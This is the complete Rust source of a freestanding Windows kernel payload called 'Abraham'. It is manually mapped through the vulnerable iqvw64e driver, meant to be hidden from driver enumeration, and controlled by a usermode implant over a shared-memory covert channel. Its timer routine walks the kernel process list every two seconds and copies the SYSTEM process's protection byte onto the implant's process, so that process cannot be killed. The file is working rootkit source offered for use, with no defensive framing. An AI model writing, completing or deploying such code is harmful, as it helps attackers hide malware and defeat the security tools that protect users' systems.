//! Abraham resident kernel payload (ABR-T021). Freestanding Rust, ZERO
//! imports: every kernel function it needs arrives through the function
//! table the mapper writes next to it (param2), and the covert channel
//! to the implant is the shared NonPagedPool block (param1). Mapped by
//! `driver map <this.sys>`, never loaded through the SCM, invisible to
//! driver enumeration when stacked with `driver modhide`.
//!
//! Behavior: a 2-second timer DPC owns a heartbeat counter (the
//! implant polls it through the iqvw64e read primitive) and a tiny
//! command protocol in the shared block. While `protect_active` is
//! set, EVERY tick re-copies the SYSTEM process's EPROCESS.Protection
//! byte onto the target pid — self-healing anti-kill that survives
//! usermode resets of the byte.
//!
//! Compiled by tools/build_payload.sh:
//!   rustc --emit=obj -O (no_std) -> rust-lld-link /SUBSYSTEM:NATIVE
//!   /ENTRY:DriverEntry /DRIVER /DYNAMICBASE
//!
//! KEEP IN SYNC: the SharedBlock/FnTable layouts are duplicated in
//! implant/src/mapper.rs (asserted by tests there).

#![no_std]
#![no_main]
#![no_builtins]

const ABRAHAM_MAGIC: u32 = 0x484D_4241; // "ABMH"
const ABRAHAM_VERSION: u32 = 1;

const CMD_NONE: u32 = 0;
const CMD_PING: u32 = 1;
const CMD_PROTECT: u32 = 2;
const CMD_UNPROTECT: u32 = 3;
const CMD_STOP: u32 = 4;

const STATUS_IDLE: u32 = 0;
const STATUS_OK: u32 = 1;
const STATUS_ERR: u32 = 0xFFFF_FFFF;

/// Covert channel block. The implant allocates+zeroes it, fills the
/// constants (offsets it discovered live on this build) and passes it
/// as DriverEntry param1.
#[repr(C)]
struct SharedBlock {
    magic: u32,
    version: u32,
    heartbeat: u32,
    command: u32,
    command_arg: u32,
    command_status: u32,
    implant_pid: u32,
    links_offset: u32,
    pid_offset: u32,
    protect_offset: u32,
    protect_active: u32,
    reserved: [u32; 5],
}

/// Kernel function table injected by the mapper (param2). Data exports
/// arrive as their addresses (dereferenced fresh each use).
#[repr(C)]
struct FnTable {
    ke_initialize_timer: unsafe extern "system" fn(*mut u8),
    ke_initialize_dpc: unsafe extern "system" fn(
        *mut u8,
        unsafe extern "system" fn(*mut u8, *mut u8, *mut u8, *mut u8),
        *mut u8,
    ),
    ke_set_timer_ex: unsafe extern "system" fn(*mut u8, i64, i32, *mut u8) -> u8,
    ke_cancel_timer: unsafe extern "system" fn(*mut u8) -> u8,
    ps_initial_system_process: *const u64,
}

/// Opaque-but-oversized storage: layouts are never touched directly,
/// the APIs just receive pointers (KTIMER 0x50, KDPC 0x40 on x64).
#[repr(C, align(16))]
struct TimerStorage([u64; 32]); // 0x100
#[repr(C, align(16))]
struct DpcStorage([u64; 16]); // 0x80

static mut TIMER: TimerStorage = TimerStorage([0; 32]);
static mut DPC: DpcStorage = DpcStorage([0; 16]);
static mut SHARED: *mut SharedBlock = 0 as *mut SharedBlock;
static mut TABLE: *const FnTable = 0 as *const FnTable;

unsafe fn vol_read32(addr: *mut u32) -> u32 {
    core::ptr::read_volatile(addr)
}
unsafe fn vol_write32(addr: *mut u32, value: u32) {
    core::ptr::write_volatile(addr, value)
}

/// Walks the process list from PsInitialSystemProcess looking for
/// `pid`; returns the EPROCESS base. All offsets come from the implant
/// (discovered live - see mapper.rs); every hop validates the link
/// shape so a stale entry aborts the walk instead of following
/// garbage.
unsafe fn find_eproc(table: &FnTable, pid: u32, links_offset: u32, pid_offset: u32) -> *mut u8 {
    let system = core::ptr::read_volatile(table.ps_initial_system_process) as *mut u8;
    if system.is_null() {
        return core::ptr::null_mut();
    }
    let head = system.wrapping_add(links_offset as usize) as *mut *mut u8;
    let mut entry = core::ptr::read_volatile(head);
    let mut hops = 0;
    while !entry.is_null() && hops < 1024 {
        let eproc = entry.wrapping_sub(links_offset as usize);
        let entry_pid = vol_read32(eproc.wrapping_add(pid_offset as usize) as *mut u32);
        if entry_pid == pid {
            return eproc;
        }
        entry = core::ptr::read_volatile(eproc.wrapping_add(links_offset as usize) as *mut *mut u8);
        if entry as usize == head as usize {
            break;
        }
        hops += 1;
    }
    core::ptr::null_mut()
}

/// Byte write through an unaligned qword read-modify-write.
unsafe fn write_byte(target: *mut u8, value: u8) {
    let qword = target as *mut u64;
    let current = core::ptr::read_volatile(qword);
    let patched = (current & !0xFF) | value as u64;
    core::ptr::write_volatile(qword, patched);
}

/// Copies the SYSTEM process's Protection byte onto `pid`. Returns
/// false when the walk fails (bad offsets on this build).
unsafe fn apply_protection(
    table: &FnTable,
    pid: u32,
    links_offset: u32,
    pid_offset: u32,
    protect_offset: u32,
) -> bool {
    let system = core::ptr::read_volatile(table.ps_initial_system_process) as *mut u8;
    if system.is_null() || protect_offset == 0 {
        return false;
    }
    let target = find_eproc(table, pid, links_offset, pid_offset);
    if target.is_null() {
        return false;
    }
    let system_byte = core::ptr::read_volatile(system.add(protect_offset as usize));
    // Only copy plausible protection bytes - never garbage.
    if system_byte == 0 {
        return false;
    }
    write_byte(target.add(protect_offset as usize), system_byte);
    true
}

unsafe fn clear_protection(
    table: &FnTable,
    pid: u32,
    links_offset: u32,
    pid_offset: u32,
    protect_offset: u32,
) -> bool {
    let target = find_eproc(table, pid, links_offset, pid_offset);
    if target.is_null() || protect_offset == 0 {
        return false;
    }
    write_byte(target.add(protect_offset as usize), 0);
    true
}

/// The 2-second tick: heartbeat, command dispatch, and the self-heal
/// re-apply while protect_active is set.
unsafe extern "system" fn tick(_dpc: *mut u8, _ctx: *mut u8, _s1: *mut u8, _s2: *mut u8) {
    let shared = SHARED;
    if shared.is_null() {
        return;
    }
    let table = TABLE;
    if table.is_null() {
        return;
    }
    let table = &*table;

    let heartbeat = vol_read32(&raw mut (*shared).heartbeat);
    vol_write32(&raw mut (*shared).heartbeat, heartbeat.wrapping_add(1));

    let command = vol_read32(&raw mut (*shared).command);
    if command != CMD_NONE {
        vol_write32(&raw mut (*shared).command, CMD_NONE);
        match command {
            CMD_PING => {
                vol_write32(&raw mut (*shared).command_status, heartbeat);
            }
            CMD_PROTECT => {
                let ok = apply_protection(
                    table,
                    vol_read32(&raw mut (*shared).command_arg),
                    vol_read32(&raw mut (*shared).links_offset),
                    vol_read32(&raw mut (*shared).pid_offset),
                    vol_read32(&raw mut (*shared).protect_offset),
                );
                vol_write32(&raw mut (*shared).protect_active, if ok { 1 } else { 0 });
                vol_write32(
                    &raw mut (*shared).command_status,
                    if ok { STATUS_OK } else { STATUS_ERR },
                );
            }
            CMD_UNPROTECT => {
                let ok = clear_protection(
                    table,
                    vol_read32(&raw mut (*shared).implant_pid),
                    vol_read32(&raw mut (*shared).links_offset),
                    vol_read32(&raw mut (*shared).pid_offset),
                    vol_read32(&raw mut (*shared).protect_offset),
                );
                vol_write32(&raw mut (*shared).protect_active, 0);
                vol_write32(
                    &raw mut (*shared).command_status,
                    if ok { STATUS_OK } else { STATUS_ERR },
                );
            }
            CMD_STOP => {
                (table.ke_cancel_timer)(TIMER.0.as_mut_ptr() as *mut u8);
                vol_write32(&raw mut (*shared).command_status, STATUS_OK);
            }
            _ => {}
        }
    }

    // Self-heal: keep re-applying while active, even if something
    // zeroed the byte since the last tick.
    if vol_read32(&raw mut (*shared).protect_active) != 0 {
        apply_protection(
            table,
            vol_read32(&raw mut (*shared).implant_pid),
            vol_read32(&raw mut (*shared).links_offset),
            vol_read32(&raw mut (*shared).pid_offset),
            vol_read32(&raw mut (*shared).protect_offset),
        );
    }
}

/// Resident entry: mapper calls DriverEntry(shared_block, fn_table).
/// Both params are kernel virtual addresses prepared in advance.
#[no_mangle]
pub unsafe extern "system" fn DriverEntry(param1: *mut u8, param2: *mut u8) -> i32 {
    if param1.is_null() || param2.is_null() {
        return 0xC000_000Du32 as i32; // STATUS_INVALID_PARAMETER
    }
    let shared = param1 as *mut SharedBlock;
    if vol_read32(&raw mut (*shared).magic) != ABRAHAM_MAGIC {
        return 0xC000_000Du32 as i32;
    }
    SHARED = shared;
    TABLE = param2 as *const FnTable;
    let table = &*TABLE;

    (table.ke_initialize_timer)(TIMER.0.as_mut_ptr() as *mut u8);
    (table.ke_initialize_dpc)(
        DPC.0.as_mut_ptr() as *mut u8,
        tick,
        core::ptr::null_mut(),
    );
    // DueTime -2s (relative), period 2000ms: repeats forever.
    (table.ke_set_timer_ex)(
        TIMER.0.as_mut_ptr() as *mut u8,
        -20_000_000i64,
        2000,
        DPC.0.as_mut_ptr() as *mut u8,
    );
    vol_write32(&raw mut (*shared).version, ABRAHAM_VERSION);
    0 // STATUS_SUCCESS
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {
        core::hint::spin_loop();
    }
}
